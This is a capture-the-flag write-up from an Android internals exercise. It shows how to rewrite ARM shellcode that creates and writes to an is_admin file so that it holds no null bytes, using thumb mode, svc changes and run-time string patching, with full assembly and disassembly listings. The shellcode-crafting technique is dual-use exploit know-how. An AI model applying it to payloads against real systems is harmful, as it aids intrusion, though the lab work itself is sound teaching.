# Nullifying Shellcode

My write up is also available at [dev.to/wireless90](https://dev.to/wireless90/nullifying-shellcode-android-internals-ctf-ex4-44i5)

Get the [executable here](https://github.com/wireless90/AndroidInternalsCTF/tree/main/Nullifying%20Shellcode)

- Our task is to write a shellcode which writes '1' to /data/local/tmp/is_admin. 
- This time, it must not contain null bytes.
- Run a.out with path as a parameter to your shellcode. 
- Do not reverse a.out

In the [previous exercise](https://dev.to/wireless90/shellcode-android-internals-ctf-ex4-4357), we had a working shellcode.

Firstly, lets try to feed that `shellcode.bin` into our new `a.out`.

```sh
┌──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/nullifiyingShellcode]
└─$ adb push a.out /data/local/tmp
a.out: 1 file pushed. 0.0 MB/s (44620 bytes in 1.975s)
                                                                                     
┌──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/nullifiyingShellcode]
└─$ adb shell                     
shell@hammerhead:/ $ su
root@hammerhead:/ # cd /data/local/tmp 
root@hammerhead:/data/local/tmp # chmod +x a.out
root@hammerhead:/data/local/tmp # ./a.out shellcode.bin
executing shellcode
[1] + Stopped (signal)     ./a.out shellcode.bin 
```

We get an error!

As the instruction suggests, our shellcode should not have any null bytes. Lets take a look at our current shellcode contents.

```sh
──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/nullifiyingShellcode]
└─$ xxd shellcode.bin
00000000: 3000 8fe2 0110 a0e3 0870 a0e3 0000 00ef  0........p......
00000010: 0400 2de5 0000 a0e1 2110 8fe2 0120 a0e3  ..-.....!.... ..
00000020: 0470 a0e3 0000 00ef 0400 9de4 0670 a0e3  .p...........p..
00000030: 0000 00ef 1eff 2fe1 6973 5f61 646d 696e  ....../.is_admin
00000040: 0031 0000                                .1..
                                       
```
We can see that there are lots of null bytes, `00`. In `c` programming, null bytes terminate strings. I suspect `a.out` to be using some kind of string functions to read our shellcode which then terminates the moment it sees a null byte.

I have edited our `commands.sh` from the previous exercise, to include extracting out our `shellcode.bin` and pushing it to our android device.

```sh
┌──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/nullifiyingShellcode]
└─$ vim commands.sh 
```

```sh
export ndk=/home/razali/Downloads/android-ndk-r21e/toolchains/arm-linux-androideabi-4.9/prebuilt/linux-x86_64/arm-linux-androideabi/bin

$ndk/as shellcode.s -o shellcode.o
$ndk/ld shellcode.o -o shellcode
$ndk/objcopy -O binary --only-section=.text shellcode shellcode.bin

echo "==============OBJDUMP OUTPUT=========================="
$ndk/objdump -d shellcode.o

echo "==============XXD OUTPUT=========================="
xxd shellcode.bin

adb push ./shellcode.bin /data/local/tmp

```

Lets run `command.sh`.

```sh
┌──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/nullifiyingShellcode]
└─$ ./commands.sh
==============OBJDUMP OUTPUT==========================

shellcode.o:     file format elf32-littlearm


Disassembly of section .text:

00000000 <_start>:
   0:   e28f0030        add     r0, pc, #48     ; 0x30
   4:   e3a01001        mov     r1, #1
   8:   e3a07008        mov     r7, #8
   c:   ef000000        svc     0x00000000
  10:   e52d0004        push    {r0}            ; (str r0, [sp, #-4]!)

00000014 <write>:
  14:   e1a00000        nop                     ; (mov r0, r0)
  18:   e28f1021        add     r1, pc, #33     ; 0x21
  1c:   e3a02001        mov     r2, #1
  20:   e3a07004        mov     r7, #4
  24:   ef000000        svc     0x00000000

00000028 <close>:
  28:   e49d0004        pop     {r0}            ; (ldr r0, [sp], #4)
  2c:   e3a07006        mov     r7, #6
  30:   ef000000        svc     0x00000000

00000034 <branch>:
  34:   e12fff1e        bx      lr

00000038 <filename>:
  38:   615f7369        .word   0x615f7369
  3c:   6e696d64        .word   0x6e696d64
        ...

00000041 <toWrite>:
  41:   0031            .short  0x0031
        ...
==============XXD OUTPUT==========================
00000000: 3000 8fe2 0110 a0e3 0870 a0e3 0000 00ef  0........p......
00000010: 0400 2de5 0000 a0e1 2110 8fe2 0120 a0e3  ..-.....!.... ..
00000020: 0470 a0e3 0000 00ef 0400 9de4 0670 a0e3  .p...........p..
00000030: 0000 00ef 1eff 2fe1 6973 5f61 646d 696e  ....../.is_admin
00000040: 0031 0000                                .1..
./shellcode.bin: 1 file pushed. 0.0 MB/s (68 bytes in 0.307s)
                                                                            
```

We can see that all the `svc #0` instructions produces a lot of null bytes, `ef000000`. Let's use `svc #0xffffff` instead to fill up the zeroes.

Now we get,

```sh
──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/nullifiyingShellcode]
└─$ ./commands.sh  
==============OBJDUMP OUTPUT==========================

shellcode.o:     file format elf32-littlearm


Disassembly of section .text:

00000000 <_start>:
   0:   e28f0030        add     r0, pc, #48     ; 0x30
   4:   e3a01001        mov     r1, #1
   8:   e3a07008        mov     r7, #8
   c:   efffffff        svc     0x00ffffff
  10:   e52d0004        push    {r0}            ; (str r0, [sp, #-4]!)

00000014 <write>:
  14:   e1a00000        nop                     ; (mov r0, r0)
  18:   e28f1021        add     r1, pc, #33     ; 0x21
  1c:   e3a02001        mov     r2, #1
  20:   e3a07004        mov     r7, #4
  24:   efffffff        svc     0x00ffffff

00000028 <close>:
  28:   e49d0004        pop     {r0}            ; (ldr r0, [sp], #4)
  2c:   e3a07006        mov     r7, #6
  30:   efffffff        svc     0x00ffffff

00000034 <branch>:
  34:   e12fff1e        bx      lr

00000038 <filename>:
  38:   615f7369        .word   0x615f7369
  3c:   6e696d64        .word   0x6e696d64
        ...

00000041 <toWrite>:
  41:   0031            .short  0x0031
        ...
==============XXD OUTPUT==========================
00000000: 3000 8fe2 0110 a0e3 0870 a0e3 ffff ffef  0........p......
00000010: 0400 2de5 0000 a0e1 2110 8fe2 0120 a0e3  ..-.....!.... ..
00000020: 0470 a0e3 ffff ffef 0400 9de4 0670 a0e3  .p...........p..
00000030: ffff ffef 1eff 2fe1 6973 5f61 646d 696e  ....../.is_admin
00000040: 0031 0000                                .1..
./shellcode.bin: 1 file pushed. 0.0 MB/s (68 bytes in 0.307s)
                                                                       
```

If we take a look at our filename,
```sh
file_name: .asciz "is_admin"
```
it produces the null byte at `offset 0x41` as seen below.

```sh
00000038 <filename>:
  38:   615f7369        .word   0x615f7369
  3c:   6e696d64        .word   0x6e696d64
        ...

00000041 <toWrite>:
  41:   0031            .short  0x0031
```

This is because, `.asciz` is a null terminated string thus `file_name: .asciz "is_admin"` produces `"is_admin\0"`, which is null terminated.

We will need to put a dummy character, and replace it with a null byte at run time.

We can easily get a `#0` by exor-ing 2 values as such.
```nasm
eor r2, r2
```
Now `r2` contains `#0`.

Then we can define our file name to be
`file_name: .ascii "is_adminX"`.

Note the use of `.ascii` instead of `.asciz`. Now our string has no null bytes, but we have a big `X` that we need to replace. We can do that with the `strb` instruction.

So the code would look like.

```nasm
eor r2, r2 //R2 now is #0
adr r3, file_name
strb r2, [r3, #8] //Replace the 9th character with a null
file_name: .ascii "is_adminX"
```

Our overall code now looks like

```nasm
.section .text
.global _start

_start:

create:
        eor r2, r2 //R2 inow is #0
        adr r0, filename
        strb r2, [r0, #8]
        mov r1, #1 //WRITE ONLY
        mov r7, #0x8 //CREAT SYS CALL
        svc #0xffffff

        //The file descriptor(fd) is returned into the r0 variable.
        //Store the file descriptor to the stack.
        //This way, we can reuse r0 for other functions and when the fd is needed,
        //we simply pop from the stack
        push {r0}

write:
        mov r0, r0 //r0 already contains the file descriptor
        adr r1, toWrite //buffer
        mov r2, #1 //write only 1 byte
        mov r7, #0x04 //syscall for write
        svc #0xffffff

close:
        pop {r0} //pop the file descriptor back
        mov r7, #0x06 //syscall for close
        svc #0xffffff


branch:
        //end of this function, lets branch back
        bx lr


filename:
        .ascii "is_adminX"

toWrite:
        .ascii "1"

```

Lets take a look at the objdump now.
```sh
==============OBJDUMP OUTPUT==========================

shellcode.o:     file format elf32-littlearm


Disassembly of section .text:

00000000 <_start>:
   0:   e0222002        eor     r2, r2, r2
   4:   e28f0034        add     r0, pc, #52     ; 0x34
   8:   e5c02008        strb    r2, [r0, #8]
   c:   e3a01001        mov     r1, #1
  10:   e3a07008        mov     r7, #8
  14:   efffffff        svc     0x00ffffff
  18:   e52d0004        push    {r0}            ; (str r0, [sp, #-4]!)

0000001c <write>:
  1c:   e1a00000        nop                     ; (mov r0, r0)
  20:   e28f1021        add     r1, pc, #33     ; 0x21
  24:   e3a02001        mov     r2, #1
  28:   e3a07004        mov     r7, #4
  2c:   efffffff        svc     0x00ffffff

00000030 <close>:
  30:   e49d0004        pop     {r0}            ; (ldr r0, [sp], #4)
  34:   e3a07006        mov     r7, #6
  38:   efffffff        svc     0x00ffffff

0000003c <branch>:
  3c:   e12fff1e        bx      lr

00000040 <filename>:
  40:   615f7369        .word   0x615f7369
  44:   6e696d64        .word   0x6e696d64
  48:   58              .byte   0x58

00000049 <toWrite>:
  49:   31              .byte   0x31
        ...
==============XXD OUTPUT==========================
00000000: 0220 22e0 3400 8fe2 0820 c0e5 0110 a0e3  . ".4.... ......
00000010: 0870 a0e3 ffff ffef 0400 2de5 0000 a0e1  .p........-.....
00000020: 2110 8fe2 0120 a0e3 0470 a0e3 ffff ffef  !.... ...p......
00000030: 0400 9de4 0670 a0e3 ffff ffef 1eff 2fe1  .....p......../.
00000040: 6973 5f61 646d 696e 5831 0000            is_adminX1..
./shellcode.bin: 1 file pushed. 0.0 MB/s (76 bytes in 0.287s)

```
Our, `add`, `push`, and `pop` commands still have null bytes. To make shellcoding easier, its better to use the `thumb` mode. `arm` instructions are `4 bytes` and thumb instructions are `2 to 4 bytes` long, therefore reducing the chance of us having a null byte.

To switch to the thumb instruction, we simply need to add `#1` to our program counter and branch to it. Also do note that `svc #0xffffff` is not supported in thumb. Simply do `svc #1` and you would not see the null byte in the thumb instruction set anymore.

The final code would look something like...
```nasm

.section .text
.global _start

_start:
        eor r2, r2 //R2 inow is #0

thumbMode:
        add r1, pc, #1
        bx r1
create:

.code 16
        adr r0, filename
        strb r2, [r0, #8]
        mov r1, #1 //WRITE ONLY
        mov r7, #0x8 //CREAT SYS CALL
        svc #1

        //The file descriptor(fd) is returned into the r0 variable.
        //Store the file descriptor to the stack.
        //This way, we can reuse r0 for other functions and when the fd is needed,
        //we simply pop from the stack
        push {r0}

write:
        //mov r0, r0 ------- r0 already contains the file descriptor
        adr r1, toWrite //buffer
        mov r2, #1 //write only 1 byte
        mov r7, #0x04 //syscall for write
        svc #1

close:
        pop {r0} //pop the file descriptor back
        mov r7, #0x06 //syscall for close
        svc #1


branch:
        //end of this function, lets branch back
        bx lr

.align 2
filename:
        .ascii "is_adminX"

.align 2
toWrite:
        .ascii "1"
```

Lets compile it and view the bin.
```sh
──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/nullifiyingShellcode]
└─$ ./commands.sh
==============OBJDUMP OUTPUT==========================

shellcode.o:     file format elf32-littlearm


Disassembly of section .text:

00000000 <_start>:
   0:   e0222002        eor     r2, r2, r2

00000004 <thumbMode>:
   4:   e28f1001        add     r1, pc, #1
   8:   e12fff11        bx      r1

0000000c <create>:
   c:   a006            add     r0, pc, #24     ; (adr r0, 28 <filename>)
   e:   7202            strb    r2, [r0, #8]
  10:   2101            movs    r1, #1
  12:   2708            movs    r7, #8
  14:   df01            svc     1
  16:   b401            push    {r0}

00000018 <write>:
  18:   a106            add     r1, pc, #24     ; (adr r1, 34 <toWrite>)
  1a:   2201            movs    r2, #1
  1c:   2704            movs    r7, #4
  1e:   df01            svc     1

00000020 <close>:
  20:   bc01            pop     {r0}
  22:   2706            movs    r7, #6
  24:   df01            svc     1

00000026 <branch>:
  26:   4770            bx      lr

00000028 <filename>:
  28:   615f7369        .word   0x615f7369
  2c:   6e696d64        .word   0x6e696d64
  30:   58              .byte   0x58
  31:   00              .byte   0x00
  32:   46c0            nop                     ; (mov r8, r8)

00000034 <toWrite>:
  34:   31              .byte   0x31
  35:   00              .byte   0x00
  36:   46c0            nop                     ; (mov r8, r8)
==============XXD OUTPUT==========================
00000000: 0220 22e0 0110 8fe2 11ff 2fe1 06a0 0272  . "......./....r
00000010: 0121 0827 01df 01b4 06a1 0122 0427 01df  .!.'.......".'..
00000020: 01bc 0627 01df 7047 6973 5f61 646d 696e  ...'..pGis_admin
00000030: 5800 c046 3100 c046                      X..F1..F
./shellcode.bin: 1 file pushed. 0.0 MB/s (56 bytes in 0.303s)
```

Great we are so close. Look at offset `0x31` now, due to alignment padding with our `.align 2`, the compiler has added an extra null byte. Lets simply remove this with adding our own extra character.

Change
```sh
.align 2
filename:
        .ascii "is_adminX"
```

to

```sh
.align 2
filename:
        .ascii "is_adminXX"  //Added extra X
```

Now lets take a look at our output again.

```sh
┌──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/nullifiyingShellcode]
└─$ ./commands.sh  
==============OBJDUMP OUTPUT==========================

shellcode.o:     file format elf32-littlearm


Disassembly of section .text:

00000000 <_start>:
   0:   e0222002        eor     r2, r2, r2

00000004 <thumbMode>:
   4:   e28f1001        add     r1, pc, #1
   8:   e12fff11        bx      r1

0000000c <create>:
   c:   a006            add     r0, pc, #24     ; (adr r0, 28 <filename>)
   e:   7202            strb    r2, [r0, #8]
  10:   2101            movs    r1, #1
  12:   2708            movs    r7, #8
  14:   df01            svc     1
  16:   b401            push    {r0}

00000018 <write>:
  18:   a106            add     r1, pc, #24     ; (adr r1, 34 <toWrite>)
  1a:   2201            movs    r2, #1
  1c:   2704            movs    r7, #4
  1e:   df01            svc     1

00000020 <close>:
  20:   bc01            pop     {r0}
  22:   2706            movs    r7, #6
  24:   df01            svc     1

00000026 <branch>:
  26:   4770            bx      lr

00000028 <filename>:
  28:   615f7369        .word   0x615f7369
  2c:   6e696d64        .word   0x6e696d64
  30:   5858            .short  0x5858
  32:   46c0            nop                     ; (mov r8, r8)

00000034 <toWrite>:
  34:   31              .byte   0x31
  35:   00              .byte   0x00
  36:   46c0            nop                     ; (mov r8, r8)
==============XXD OUTPUT==========================
00000000: 0220 22e0 0110 8fe2 11ff 2fe1 06a0 0272  . "......./....r
00000010: 0121 0827 01df 01b4 06a1 0122 0427 01df  .!.'.......".'..
00000020: 01bc 0627 01df 7047 6973 5f61 646d 696e  ...'..pGis_admin
00000030: 5858 c046 3100 c046                      XX.F1..F
./shellcode.bin: 1 file pushed. 0.0 MB/s (56 bytes in 0.304s)

```

Great no more null bytes(ignore the end null bytes).

Lets head back to our android device and run our `shellcode.bin`.

```sh
root@hammerhead:/data/local/tmp # ./a.out shellcode.bin                        
executing shellcode
You did it!
The flag is: "nununu"
```